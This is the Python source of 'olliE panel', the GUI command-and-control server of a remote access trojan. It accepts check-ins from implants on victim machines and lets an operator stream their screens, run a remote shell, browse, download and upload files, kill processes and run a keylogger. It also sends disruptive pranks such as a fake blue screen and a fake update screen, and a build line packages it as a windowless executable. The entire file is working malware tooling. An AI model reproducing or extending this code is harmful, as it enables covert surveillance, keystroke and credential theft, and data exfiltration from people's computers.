#!/usr/bin/env python3
# rat/gui_server.py — GUI control panel v4. python 3.9+, pillow required.
# usage: python gui_server.py
# exe:   pyinstaller --onefile --noconsole --name panel --clean gui_server.py
# live view runs on its own socket (PORT+1), so commands never queue behind frames
import socket, threading, base64, os, sys, time, io, queue, uuid, json
import tkinter as tk
from tkinter import ttk, filedialog, messagebox
from PIL import Image, ImageTk

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from server import CFG as NET, send_frame, recv_frame
from pranks import PRANK_FUNCS

CFG = {"HOST": NET["HOST"], "PORT": NET["PORT"], "STREAM_PORT": NET["PORT"] + 1,
       "DIAL": "127.0.0.1",  # panel always talks to its own listeners
       "BUF_CAP": NET["BUF_CAP"], "TIMEOUT": NET["TIMEOUT"],
       "SS_SCALE": 0.45, "SS_QUALITY": 40, "CHUNK": 1024 * 1024, "XFER_CAP": 512 * 1024 * 1024}

CLIENTS = {}          # cid -> {"conn", "addr", "info", "lock"}
STREAMS = {}          # cid -> stream socket (panel side)
CL = threading.Lock()
GUI_Q = None

PRANK_HELP = {
    "beeps": "мелодия системным спикером, 3 раза",
    "bsod": "фейковый синий экран 30 сек (ESC убирает)",
    "cdtray": "лоток дисковода 3 раза открывается",
    "fakeupdate": "полноэкранное «Working on updates» 45 сек",
    "hideicons": "прячет иконки рабочего стола на 10 сек",
    "invert": "чёрная плашка на весь экран 4 сек",
    "jiggle": "курсор дёргается 20 сек",
    "mouseblock": "курсор приколот к месту 12 сек",
    "msgbox": "окно с твоим текстом",
    "notepad": "блокнот открывается и печатает текст",
    "rotate": "экран на 180° на 15 сек, потом вернётся",
    "speak": "компьютер озвучивает твой текст",
    "spiral": "курсор кружит воронкой 15 сек",
    "swapmouse": "кнопки мыши меняются на 30 сек",
    "taskbarhide": "панель задач прячется на 12 сек",
    "type": "призрачная печать текста в фокус",
    "volume": "громкость: минимум, затем максимум",
    "wallpaper": "обои в чёрный цвет",
    "webpage": "3 раза открывает вкладку",
}

PRANK_USAGE = {
    "msgbox": "заполни text — что будет в окне",
    "speak": "заполни text — что скажет голосом",
    "notepad": "заполни text — что напечатает в блокноте",
    "type": "заполни text; на цели открой любую программу с полем ввода — текст напечатается сам",
    "webpage": "заполни url — какую вкладку открывать (по умолчанию rickroll)",
}
PRANK_USAGE_DEFAULT = "ничего заполнять не надо — просто нажми кнопку"


def drop(cid: str) -> bool:
    with CL:
        c = CLIENTS.pop(cid, None)
    if c:
        try:
            c["conn"].close()
        except OSError:
            pass
    if GUI_Q:
        GUI_Q.put(("targets", None))
    return c is not None


def make_listener(port: int) -> socket.socket:
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((CFG["HOST"], port))
    srv.listen(16)
    return srv


def accept_loop(srv: socket.socket, q: queue.Queue) -> None:
    while True:
        try:
            conn, addr = srv.accept()
        except OSError:
            return
        conn.settimeout(CFG["TIMEOUT"])
        try:
            hello = recv_frame(conn)
        except Exception:
            try:
                conn.close()
            except OSError:
                pass
            continue
        cid = hello.get("id") or uuid.uuid4().hex[:8]
        with CL:
            old = CLIENTS.get(cid)
            if old:
                try:
                    old["conn"].close()
                except OSError:
                    pass
            CLIENTS[cid] = {"conn": conn, "addr": addr, "info": hello, "lock": threading.Lock()}
        if q:
            q.put(("log", f"[+] {cid} from {addr[0]} ({hello.get('os', '?')} / {hello.get('user', '?')})"))
            q.put(("targets", None))


def accept_stream_loop(srv: socket.socket, q: queue.Queue) -> None:
    while True:
        try:
            conn, addr = srv.accept()
        except OSError:
            return
        conn.settimeout(60)
        try:
            hello = recv_frame(conn)
        except Exception:
            try:
                conn.close()
            except OSError:
                pass
            continue
        if hello.get("ch") != "stream":
            try:
                conn.close()
            except OSError:
                pass
            continue
        with CL:
            STREAMS[hello.get("id", "?")] = conn


def call_target(cid: str, obj: dict) -> dict:
    with CL:
        c = CLIENTS.get(cid)
    if not c:
        return {"ok": False, "err": "no target selected"}
    try:
        with c["lock"]:
            send_frame(c["conn"], obj)
            c["conn"].settimeout(CFG["TIMEOUT"])
            return recv_frame(c["conn"])
    except Exception as e:
        drop(cid)
        return {"ok": False, "err": f"link dead: {e}"}


class App(tk.Tk):
    def __init__(self):
        super().__init__()
        global GUI_Q
        try:
            style = ttk.Style(self)
            style.theme_use("vista")
            style.configure("TNotebook.Tab", padding=(16, 7))
            style.configure("TButton", padding=(10, 5))
        except Exception:
            pass
        self.title("olliE panel")
        self.geometry("1240x800")
        self.minsize(1000, 660)
        self.q = queue.Queue()
        GUI_Q = self.q
        self.current = None
        self.stream_on = False
        self.stream_sock = None
        self.stream_scale = CFG["SS_SCALE"]
        self.stream_quality = CFG["SS_QUALITY"]
        self._img = None
        self._last_frame = None
        self._files_rows = []
        self._kauto = False
        self.hist = []
        self.hist_i = 0
        self.fps_count = 0
        self.fps_t = time.time()

        try:
            self.listener = make_listener(CFG["PORT"])
            self.stream_listener = make_listener(CFG["STREAM_PORT"])
        except OSError as e:
            messagebox.showerror(
                "port busy",
                f"cannot bind {CFG['HOST']}:{CFG['PORT']} / {CFG['STREAM_PORT']}\n{e}\n\n"
                "another server.exe / panel.exe is probably running — close it first.")
            self.destroy()
            return

        head = ttk.Frame(self, padding=(10, 6))
        head.pack(fill="x")
        ttk.Label(head, text="olliE panel", font=("Segoe UI", 15, "bold")).pack(side="left")
        self.head_state = tk.StringVar(value=f"listener :{CFG['PORT']}  |  stream :{CFG['STREAM_PORT']}")
        ttk.Label(head, textvariable=self.head_state, foreground="#0a7").pack(side="left", padx=14)
        self.head_target = tk.StringVar(value="no target")
        ttk.Label(head, textvariable=self.head_target, font=("Segoe UI", 11, "bold")).pack(side="right")

        body = ttk.Frame(self)
        body.pack(fill="both", expand=True)

        left = ttk.Frame(body, padding=6)
        left.pack(side="left", fill="y")
        ttk.Label(left, text="targets").pack(anchor="w")
        self.targets = tk.Listbox(left, width=34, height=14, font=("Segoe UI", 10), exportselection=False)
        self.targets.pack(fill="y", expand=True)
        self.targets.bind("<Double-Button-1>", self.pick_target)
        ttk.Button(left, text="select", command=self.pick_target).pack(fill="x", pady=2)
        ttk.Button(left, text="refresh", command=self.refresh_targets).pack(fill="x")
        panic = tk.Button(left, text="PANIC — stop pranks on ALL",
                          command=self.panic_all, bg="#b03030", fg="white",
                          activebackground="#d05050", font=("Segoe UI", 9, "bold"))
        panic.pack(fill="x", pady=(10, 2))

        self.nb = ttk.Notebook(body)
        self.nb.pack(side="left", fill="both", expand=True)
        self.tab_screen = ttk.Frame(self.nb)
        self.tab_shell = ttk.Frame(self.nb, padding=6)
        self.tab_files = ttk.Frame(self.nb, padding=6)
        self.tab_procs = ttk.Frame(self.nb, padding=6)
        self.tab_pranks = ttk.Frame(self.nb, padding=6)
        self.tab_keylog = ttk.Frame(self.nb, padding=6)
        self.tab_info = ttk.Frame(self.nb, padding=6)
        for tab, title in ((self.tab_screen, "screen"), (self.tab_shell, "shell"),
                           (self.tab_files, "files"), (self.tab_procs, "processes"),
                           (self.tab_pranks, "pranks"), (self.tab_keylog, "keylog"),
                           (self.tab_info, "sysinfo")):
            self.nb.add(tab, text=title)
        self._build_screen()
        self._build_shell()
        self._build_files()
        self._build_procs()
        self._build_pranks()
        self._build_keylog()
        self._build_info()

        self.status = tk.StringVar(value="waiting for check-ins...")
        bar = ttk.Frame(self, relief="groove", padding=(8, 3))
        bar.pack(fill="x", side="bottom")
        ttk.Label(bar, textvariable=self.status, foreground="#444").pack(side="left")

        threading.Thread(target=accept_loop, args=(self.listener, self.q), daemon=True).start()
        threading.Thread(target=accept_stream_loop, args=(self.stream_listener, self.q), daemon=True).start()
        self.after(150, self.pump)
        self.after(3000, self.auto_poll)
        self.after(2500, self.kauto_tick)

    # ---------- plumbing ----------

    def bg(self, fn, cb):
        def run():
            try:
                res = fn()
            except Exception as e:
                res = {"ok": False, "err": str(e)}
            self.after(0, lambda: cb(res))
        threading.Thread(target=run, daemon=True).start()

    def log(self, msg: str) -> None:
        self.status.set(msg)

    def pump(self):
        try:
            while True:
                kind, data = self.q.get_nowait()
                if kind == "log":
                    self.log(data)
                elif kind == "targets":
                    self.refresh_targets()
                elif kind == "frame":
                    self.show_frame(data)
        except queue.Empty:
            pass
        self.after(150, self.pump)

    def auto_poll(self):
        self.refresh_targets()
        self.after(3000, self.auto_poll)

    def refresh_targets(self):
        sel = self.targets.curselection()
        sel_cid = self.targets.get(sel[0]).split("  ")[0] if sel else None
        self.targets.delete(0, tk.END)
        with CL:
            items = list(CLIENTS.items())
        for cid, c in items:
            self.targets.insert(tk.END, f"{cid}  {c['addr'][0]}  {c['info'].get('user', '?')}")
        if sel_cid:
            for i in range(self.targets.size()):
                if self.targets.get(i).split("  ")[0] == sel_cid:
                    self.targets.selection_set(i)
                    break

    def need_target(self):
        sel = self.targets.curselection()
        if sel:
            self.current = self.targets.get(sel[0]).split("  ")[0]
        if (not self.current or self.current not in CLIENTS) and self.targets.size() == 1:
            self.current = self.targets.get(0).split("  ")[0]
        if not self.current or self.current not in CLIENTS:
            self.log("no target — double-click a machine in the list")
            return None
        self.head_target.set(self.current)
        return self.current

    def pick_target(self, *_):
        cid = self.need_target()
        if cid:
            c = CLIENTS.get(cid)
            if c:
                self.head_target.set(f"{cid} — {c['info'].get('user', '?')} @ {c['addr'][0]}")
            self.bg(lambda: call_target(cid, {"cmd": "sysinfo"}), self.apply_info)

    def apply_info(self, r):
        if r.get("ok"):
            i = r.get("info", {})
            self.log(f"{i.get('host', '?')}: {i.get('os', '?')} | ram {i.get('ram', '?')} | ip {i.get('ip', '?')}")

    def panic_all(self):
        with CL:
            cids = list(CLIENTS.keys())
        if not cids:
            self.log("panic: no targets connected")
            return
        def fn():
            out = []
            for cid in cids:
                r = call_target(cid, {"cmd": "prank", "name": "stop"})
                out.append(f"{cid}:{'ok' if r.get('ok') else r.get('err')}")
            return {"ok": True, "out": "  ".join(out)}
        self.bg(fn, lambda r: self.log(f"panic → {r.get('out')}"))

    # ---------- screen ----------

    def _build_screen(self):
        bar = ttk.Frame(self.tab_screen, padding=6)
        bar.pack(fill="x")
        self.btn_stream = ttk.Button(bar, text="start live view", command=self.toggle_stream)
        self.btn_stream.pack(side="left")
        ttk.Button(bar, text="one screenshot", command=self.one_shot).pack(side="left", padx=6)
        ttk.Button(bar, text="save frame", command=self.save_frame).pack(side="left")
        ttk.Label(bar, text="quality:").pack(side="left", padx=(12, 0))
        self.qual = tk.StringVar(value=str(CFG["SS_QUALITY"]))
        ttk.Spinbox(bar, from_=10, to=90, width=5, textvariable=self.qual).pack(side="left", padx=4)
        ttk.Label(bar, text="scale:").pack(side="left")
        self.scale = tk.StringVar(value=str(CFG["SS_SCALE"]))
        ttk.Spinbox(bar, from_=0.2, to=1.0, increment=0.05, width=5, textvariable=self.scale).pack(side="left", padx=4)
        self.fps_var = tk.StringVar(value="")
        ttk.Label(bar, textvariable=self.fps_var, foreground="#0a7").pack(side="left", padx=10)
        self.screen_label = ttk.Label(self.tab_screen, anchor="center", background="#222")
        self.screen_label.pack(fill="both", expand=True)

    def toggle_stream(self):
        if self.stream_on:
            self.stop_stream()
            return
        cid = self.need_target()
        if not cid:
            return
        try:
            self.stream_scale = float(self.scale.get() or CFG["SS_SCALE"])
            self.stream_quality = int(self.qual.get() or CFG["SS_QUALITY"])
        except ValueError:
            self.stream_scale, self.stream_quality = CFG["SS_SCALE"], CFG["SS_QUALITY"]

        def fn():
            return call_target(cid, {"cmd": "stream_open"})
        def cb(r):
            if not r.get("ok"):
                self.log(f"stream open err: {r.get('err')}")
                return
            time.sleep(0.4)  # implant dials the stream port first
            try:
                s = socket.create_connection((CFG["DIAL"], CFG["STREAM_PORT"]), timeout=5)
                s.settimeout(30)
                send_frame(s, {"id": cid, "ch": "panel"})
            except OSError as e:
                self.log(f"stream channel err: {e}")
                return
            self.stream_on = True
            self.stream_sock = s
            self.btn_stream.config(text="stop live view")
            self.fps_count, self.fps_t = 0, time.time()
            threading.Thread(target=self.stream_loop, args=(cid, s), daemon=True).start()
        self.bg(fn, cb)

    def stop_stream(self):
        self.stream_on = False
        s, self.stream_sock = self.stream_sock, None
        if s:
            try:
                s.close()
            except OSError:
                pass
        self.btn_stream.config(text="start live view")
        cid = self.current
        if cid:
            self.bg(lambda: call_target(cid, {"cmd": "stream_stop"}), lambda r: None)

    def stream_loop(self, cid, s):
        # pull model: round trip paces the stream, commands never block
        while self.stream_on and s is self.stream_sock:
            try:
                send_frame(s, {"cmd": "frame", "scale": self.stream_scale,
                               "quality": self.stream_quality})
                r = recv_frame(s)
            except Exception:
                if self.stream_on:
                    self.q.put(("log", "stream stopped — channel closed"))
                    self.after(0, self.stop_stream)
                return
            if "err" in r:
                self.q.put(("log", f"stream: {r['err']}; stopping"))
                self.after(0, self.stop_stream)
                return
            if "data" in r:
                self.q.put(("frame", r["data"]))

    def show_frame(self, data_b64):
        try:
            raw = base64.b64decode(data_b64)
            self._last_frame = raw
            img = Image.open(io.BytesIO(raw))
            lw = max(self.screen_label.winfo_width(), 320)
            lh = max(self.screen_label.winfo_height(), 200)
            img.thumbnail((lw, lh))
            self._img = ImageTk.PhotoImage(img)
            self.screen_label.config(image=self._img)
            self.fps_count += 1
            now = time.time()
            if now - self.fps_t >= 1.0:
                self.fps_var.set(f"{self.fps_count / (now - self.fps_t):.1f} fps")
                self.fps_count, self.fps_t = 0, now
        except Exception as e:
            self.log(f"frame err: {e}")

    def save_frame(self):
        if not self._last_frame:
            self.log("no frame yet — start live view or take a screenshot first")
            return
        path = filedialog.asksaveasfilename(defaultextension=".jpg",
                                            initialfile=f"frame_{int(time.time())}.jpg",
                                            filetypes=[("JPEG", "*.jpg")])
        if not path:
            return
        with open(path, "wb") as f:
            f.write(self._last_frame)
        self.log(f"saved: {path}")

    def one_shot(self):
        cid = self.need_target()
        if not cid:
            return
        self.log("grabbing screenshot...")
        def fn():
            r = call_target(cid, {"cmd": "ss"})
            if not r.get("ok"):
                return r
            path = os.path.join(os.path.dirname(os.path.abspath(__file__)), f"ss_{cid}_{int(time.time())}.png")
            with open(path, "wb") as f:
                f.write(base64.b64decode(r["data"]))
            return {"ok": True, "data": r["data"], "out": path}
        def cb(r):
            if r.get("ok"):
                self.show_frame(r["data"])
                self.log(f"saved: {r['out']}")
            else:
                self.log(f"err: {r.get('err')}")
        self.bg(fn, cb)

    # ---------- shell ----------

    def _build_shell(self):
        self.shell_cwd = tk.StringVar(value="?")
        prompt = ttk.Frame(self.tab_shell)
        prompt.pack(fill="x")
        ttk.Label(prompt, text="cwd:").pack(side="left")
        ttk.Label(prompt, textvariable=self.shell_cwd, font=("Consolas", 10, "bold")).pack(side="left", padx=4)
        chips = ttk.Frame(self.tab_shell)
        chips.pack(fill="x", pady=(4, 2))
        for label, cmd in (("whoami", "whoami"), ("ipconfig", "ipconfig"),
                           ("tasklist", "tasklist /FO TABLE"), ("systeminfo", "systeminfo")):
            ttk.Button(chips, text=label, width=11,
                       command=lambda c=cmd: self.run_shell(c)).pack(side="left", padx=2)
        self.shell_out = tk.Text(self.tab_shell, height=16, font=("Consolas", 10),
                                 state="disabled", background="#1e1e1e", foreground="#d4d4d4")
        self.shell_out.pack(fill="both", expand=True)
        row = ttk.Frame(self.tab_shell)
        row.pack(fill="x", pady=4)
        self.shell_in = ttk.Entry(row, font=("Consolas", 10))
        self.shell_in.pack(side="left", fill="x", expand=True)
        self.shell_in.bind("<Return>", lambda e: self.run_shell())
        self.shell_in.bind("<Up>", self.hist_up)
        self.shell_in.bind("<Down>", self.hist_dn)
        ttk.Button(row, text="run", command=lambda: self.run_shell()).pack(side="left", padx=4)
        ttk.Button(row, text="clear", command=self.shell_clear).pack(side="left")

    def hist_up(self, _):
        if self.hist:
            self.hist_i = max(0, self.hist_i - 1)
            self.shell_in.delete(0, tk.END)
            self.shell_in.insert(0, self.hist[self.hist_i])
        return "break"

    def hist_dn(self, _):
        if self.hist:
            self.hist_i = min(len(self.hist), self.hist_i + 1)
            self.shell_in.delete(0, tk.END)
            if self.hist_i < len(self.hist):
                self.shell_in.insert(0, self.hist[self.hist_i])
        return "break"

    def shell_write(self, text):
        self.shell_out.config(state="normal")
        self.shell_out.insert(tk.END, text)
        self.shell_out.see(tk.END)
        self.shell_out.config(state="disabled")

    def shell_clear(self):
        self.shell_out.config(state="normal")
        self.shell_out.delete("1.0", tk.END)
        self.shell_out.config(state="disabled")

    def run_shell(self, line=None):
        cid = self.need_target()
        if not cid:
            return
        if line is None:
            line = self.shell_in.get().strip()
            if not line:
                return
            self.shell_in.delete(0, tk.END)
            self.hist.append(line)
            self.hist_i = len(self.hist)
        self.shell_write(f"\n> {line}\n")
        def fn():
            return call_target(cid, {"cmd": "shell", "line": line})
        def cb(r):
            if r.get("cwd"):
                self.shell_cwd.set(r["cwd"])
            if r.get("ok"):
                out = r.get("out") or "(no output)"
                if r.get("code") not in (None, 0):
                    out += f"\n[exit {r['code']}]"
                self.shell_write(out)
            else:
                self.shell_write(f"err: {r.get('err')}\n")
        self.bg(fn, cb)

    # ---------- files ----------

    def _build_files(self):
        row = ttk.Frame(self.tab_files)
        row.pack(fill="x")
        ttk.Label(row, text="path:").pack(side="left")
        self.path_var = tk.StringVar(value="C:\\")
        ttk.Entry(row, textvariable=self.path_var).pack(side="left", fill="x", expand=True, padx=4)
        ttk.Button(row, text="list", command=self.do_ls).pack(side="left")
        ttk.Button(row, text="up", command=self.go_up).pack(side="left", padx=4)
        drives = ttk.Frame(self.tab_files)
        drives.pack(fill="x", pady=2)
        for letter in "CDEFGH":
            ttk.Button(drives, text=f"{letter}:", width=4,
                       command=lambda l=letter: self.go_drive(l)).pack(side="left", padx=2)
        frow = ttk.Frame(self.tab_files)
        frow.pack(fill="x", pady=2)
        ttk.Label(frow, text="filter:").pack(side="left")
        self.filter_var = tk.StringVar()
        fe = ttk.Entry(frow, textvariable=self.filter_var)
        fe.pack(side="left", fill="x", expand=True, padx=4)
        fe.bind("<KeyRelease>", lambda e: self.apply_filter())
        self.files_box = tk.Listbox(self.tab_files, font=("Consolas", 10), height=14)
        self.files_box.pack(fill="both", expand=True, pady=4)
        self.files_box.bind("<Double-Button-1>", self.on_file_dbl)
        row2 = ttk.Frame(self.tab_files)
        row2.pack(fill="x")
        ttk.Button(row2, text="download selected", command=self.do_dl).pack(side="left")
        ttk.Button(row2, text="upload to path...", command=self.do_ul).pack(side="left", padx=4)
        ttk.Label(self.tab_files, text="double-click a folder to open it · filter searches names",
                  foreground="#777").pack(anchor="w")

    def go_up(self):
        cur = self.path_var.get().rstrip("\\/")
        parent = os.path.dirname(cur)
        if parent and parent != cur:
            self.path_var.set(parent)
            self.do_ls()

    def go_drive(self, letter):
        self.path_var.set(f"{letter}:\\")
        self.do_ls()

    def apply_filter(self):
        needle = self.filter_var.get().lower()
        self.files_box.delete(0, tk.END)
        for line in self._files_rows:
            if not needle or needle in line.lower():
                self.files_box.insert(tk.END, line)

    def on_file_dbl(self, _):
        sel = self.files_box.curselection()
        if not sel:
            return
        parts = self.files_box.get(sel[0]).split("\t")
        if len(parts) >= 3 and parts[0] == "d":
            cur = self.path_var.get().rstrip("\\/")
            self.path_var.set(cur + "\\" + parts[-1])
            self.do_ls()
        return "break"

    def do_ls(self):
        cid = self.need_target()
        if not cid:
            return
        path = self.path_var.get().strip()
        def fn():
            return call_target(cid, {"cmd": "ls", "path": path})
        def cb(r):
            if not r.get("ok"):
                self.log(f"ls err: {r.get('err')}")
                return
            rows = r.get("out", "").splitlines()
            dirs = sorted(x for x in rows if x.startswith("d\t"))
            files = sorted(x for x in rows if not x.startswith("d\t"))
            self._files_rows = dirs + files
            self.apply_filter()
            self.log(f"{len(dirs)} folders, {len(files)} files")
        self.bg(fn, cb)

    def _sel_name(self):
        sel = self.files_box.curselection()
        if not sel:
            self.log("select a file in the list first")
            return None
        parts = self.files_box.get(sel[0]).split("\t")
        if len(parts) >= 3 and parts[0] == "d":
            self.log("that is a folder — double-click it to open")
            return None
        return parts[-1] if parts else None

    def do_dl(self):
        cid = self.need_target()
        if not cid:
            return
        name = self._sel_name()
        if not name:
            return
        remote = self.path_var.get().rstrip("\\/") + "\\" + name
        chunk = CFG["CHUNK"]
        def fn():
            parts = []
            off = 0
            total = None
            while True:
                r = call_target(cid, {"cmd": "dl_chunk", "path": remote, "off": off, "n": chunk})
                if not r.get("ok"):
                    return r
                total = r["total"]
                if total > CFG["XFER_CAP"]:
                    return {"ok": False, "err": f"file {total / 2**20:.0f} MB > {CFG['XFER_CAP'] // 2**20} MB cap"}
                blob = base64.b64decode(r["data"])
                parts.append(blob)
                off += len(blob)
                if total:
                    self.after(0, lambda p=off / total: self.log(f"downloading {name}... {p:.0%}"))
                if r["n"] < chunk or off >= total:
                    break
            data = b"".join(parts)
            dst = os.path.join(os.path.dirname(os.path.abspath(__file__)), name)
            with open(dst, "wb") as f:
                f.write(data)
            return {"ok": True, "out": f"{dst} ({len(data) / 2**20:.1f} MB)"}
        self.bg(fn, lambda r: self.log(r.get("out") or f"dl err: {r.get('err')}"))

    def do_ul(self):
        cid = self.need_target()
        if not cid:
            return
        local = filedialog.askopenfilename()
        if not local:
            return
        remote = self.path_var.get().rstrip("\\/") + "\\" + os.path.basename(local)
        chunk = CFG["CHUNK"]
        size = os.path.getsize(local)
        if size > CFG["XFER_CAP"]:
            self.log(f"file {size / 2**20:.0f} MB over cap")
            return
        def fn():
            with open(local, "rb") as f:
                off = 0
                first = True
                while True:
                    blob = f.read(chunk)
                    if not blob and not first:
                        break
                    r = call_target(cid, {"cmd": "ul_chunk", "path": remote,
                                          "data": base64.b64encode(blob).decode(),
                                          "off": off, "truncate": first})
                    if not r.get("ok"):
                        return r
                    first = False
                    off += len(blob)
                    self.after(0, lambda p=(off / size if size else 1): self.log(f"uploading... {p:.0%}"))
                    if not blob:
                        break
            return {"ok": True, "out": f"{remote} ({size / 2**20:.1f} MB)"}
        self.bg(fn, lambda r: self.log(r.get("out") or f"upload err: {r.get('err')}"))

    # ---------- processes ----------

    def _build_procs(self):
        row = ttk.Frame(self.tab_procs)
        row.pack(fill="x")
        ttk.Button(row, text="refresh", command=self.do_ps).pack(side="left")
        ttk.Button(row, text="kill selected", command=self.do_kill).pack(side="left", padx=4)
        ttk.Label(self.tab_procs, text="pid / name / memory — kill needs admin for system processes",
                  foreground="#777").pack(anchor="w", pady=2)
        self.ps_box = tk.Listbox(self.tab_procs, font=("Consolas", 10), height=20)
        self.ps_box.pack(fill="both", expand=True, pady=4)

    def do_ps(self):
        cid = self.need_target()
        if not cid:
            return
        def fn():
            return call_target(cid, {"cmd": "ps"})
        def cb(r):
            self.ps_box.delete(0, tk.END)
            if r.get("ok"):
                for line in r.get("out", "").splitlines():
                    self.ps_box.insert(tk.END, line)
            else:
                self.log(f"ps err: {r.get('err')}")
        self.bg(fn, cb)

    def do_kill(self):
        cid = self.need_target()
        if not cid:
            return
        sel = self.ps_box.curselection()
        if not sel:
            self.log("select a process first")
            return
        pid = self.ps_box.get(sel[0]).split("\t")[0]
        def fn():
            return call_target(cid, {"cmd": "shell", "line": f"taskkill /F /PID {pid}"})
        def cb(r):
            out = (r.get("out") or r.get("err") or "").strip()
            self.log(f"kill {pid}: {out.splitlines()[-1] if out else 'no output'}")
            self.do_ps()
        self.bg(fn, cb)

    # ---------- pranks ----------

    def _build_pranks(self):
        row = ttk.Frame(self.tab_pranks)
        row.pack(fill="x", pady=2)
        ttk.Label(row, text="text (msgbox / speak / notepad / type):").pack(side="left")
        self.prank_text = ttk.Entry(row)
        self.prank_text.pack(side="left", fill="x", expand=True, padx=4)
        row2 = ttk.Frame(self.tab_pranks)
        row2.pack(fill="x", pady=2)
        ttk.Label(row2, text="url (webpage):").pack(side="left")
        self.prank_url = ttk.Entry(row2)
        self.prank_url.pack(side="left", fill="x", expand=True, padx=4)
        grid = ttk.Frame(self.tab_pranks)
        grid.pack(fill="both", expand=True, pady=6)
        names = sorted(n for n in PRANK_FUNCS if n != "stop")
        self.prank_desc = tk.StringVar(value="наведи на кнопку — здесь будет описание и как применять")
        cols = 4
        for i, name in enumerate(names):
            b = ttk.Button(grid, text=name, width=16,
                           command=lambda n=name: self.fire_prank(n))
            b.grid(row=i // cols, column=i % cols, padx=3, pady=3)
            b.bind("<Enter>", lambda e, n=name: self.show_prank_desc(n))
            b.bind("<Leave>", lambda e: self.prank_desc.set(""))
        ttk.Label(self.tab_pranks, textvariable=self.prank_desc, wraplength=720,
                  foreground="#555", font=("Segoe UI", 9)).pack(fill="x")
        stop = tk.Button(self.tab_pranks, text="STOP ALL PRANKS", command=self.stop_pranks,
                         bg="#b03030", fg="white", activebackground="#d05050",
                         font=("Segoe UI", 10, "bold"), pady=4)
        stop.pack(fill="x", pady=4)

    def show_prank_desc(self, name):
        self.prank_desc.set(f"{name}: {PRANK_HELP.get(name, '?')} · {PRANK_USAGE.get(name, PRANK_USAGE_DEFAULT)}")
        self.log("")

    def fire_prank(self, name):
        cid = self.need_target()
        if not cid:
            return
        payload = {"cmd": "prank", "name": name}
        t = self.prank_text.get().strip()
        u = self.prank_url.get().strip()
        if t:
            payload["text"] = t
        if u:
            payload["url"] = u
        self.bg(lambda: call_target(cid, payload),
                lambda r: self.log(f"{name}: ok" if r.get("ok") else f"{name} err: {r.get('err')}"))

    def stop_pranks(self):
        cid = self.need_target()
        if not cid:
            return
        self.bg(lambda: call_target(cid, {"cmd": "prank", "name": "stop"}),
                lambda r: self.log("all pranks stopped" if r.get("ok") else f"err: {r.get('err')}"))

    # ---------- keylog ----------

    def _build_keylog(self):
        row = ttk.Frame(self.tab_keylog)
        row.pack(fill="x")
        ttk.Button(row, text="start", command=lambda: self.keylog("on")).pack(side="left")
        ttk.Button(row, text="stop", command=lambda: self.keylog("off")).pack(side="left", padx=4)
        ttk.Button(row, text="dump & clear", command=lambda: self.keylog("dump")).pack(side="left")
        self.kauto_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(row, text="live", variable=self.kauto_var).pack(side="left", padx=10)
        ttk.Button(row, text="save log", command=self.klog_save).pack(side="left")
        ttk.Button(row, text="clear view", command=self.klog_clear).pack(side="left", padx=4)
        self.klog_out = tk.Text(self.tab_keylog, height=20, font=("Consolas", 10),
                                state="disabled", background="#1e1e1e", foreground="#d4d4d4")
        self.klog_out.pack(fill="both", expand=True, pady=4)

    def kauto_tick(self):
        if self._kauto and self.current:
            self.keylog("dump", silent=True)
        self._kauto = self.kauto_var.get()
        self.after(2500, self.kauto_tick)

    def klog_save(self):
        text = self.klog_out.get("1.0", tk.END)
        if not text.strip():
            self.log("log is empty")
            return
        path = filedialog.asksaveasfilename(defaultextension=".txt",
                                            initialfile=f"keylog_{int(time.time())}.txt",
                                            filetypes=[("Text", "*.txt")])
        if path:
            with open(path, "w", encoding="utf-8") as f:
                f.write(text)
            self.log(f"saved: {path}")

    def klog_clear(self):
        self.klog_out.config(state="normal")
        self.klog_out.delete("1.0", tk.END)
        self.klog_out.config(state="disabled")

    def keylog(self, mode, silent=False):
        cid = self.need_target()
        if not cid:
            return
        def fn():
            return call_target(cid, {"cmd": "keylog", "mode": mode})
        def cb(r):
            if not r.get("ok"):
                if not silent:
                    self.log(f"keylog err: {r.get('err')}")
                return
            if mode == "dump":
                out = r.get("out") or ""
                if out and out != "(empty)":
                    self.klog_out.config(state="normal")
                    self.klog_out.insert(tk.END, out)
                    self.klog_out.see(tk.END)
                    self.klog_out.config(state="disabled")
            elif not silent:
                self.log(f"keylog {mode}: ok")
        self.bg(fn, cb)

    # ---------- sysinfo ----------

    def _build_info(self):
        row = ttk.Frame(self.tab_info)
        row.pack(fill="x")
        ttk.Button(row, text="fetch sysinfo", command=self.fetch_info).pack(side="left")
        ttk.Button(row, text="copy json", command=self.copy_info).pack(side="left", padx=4)
        self.info_out = tk.Text(self.tab_info, height=22, font=("Consolas", 10),
                                state="disabled", background="#1e1e1e", foreground="#d4d4d4")
        self.info_out.pack(fill="both", expand=True, pady=4)
        self._info_json = ""

    def fetch_info(self):
        cid = self.need_target()
        if not cid:
            return
        def fn():
            return call_target(cid, {"cmd": "sysinfo"})
        def cb(r):
            self.info_out.config(state="normal")
            self.info_out.delete("1.0", tk.END)
            if r.get("ok"):
                info = r.get("info", {})
                self._info_json = json.dumps(info, indent=2, ensure_ascii=False)
                for k, v in info.items():
                    self.info_out.insert(tk.END, f"{k:>12}: {v}\n")
            else:
                self._info_json = ""
                self.info_out.insert(tk.END, f"err: {r.get('err')}")
            self.info_out.config(state="disabled")
        self.bg(fn, cb)

    def copy_info(self):
        if not self._info_json:
            self.log("nothing to copy — fetch first")
            return
        self.clipboard_clear()
        self.clipboard_append(self._info_json)
        self.log("sysinfo copied to clipboard")


if __name__ == "__main__":
    App().mainloop()
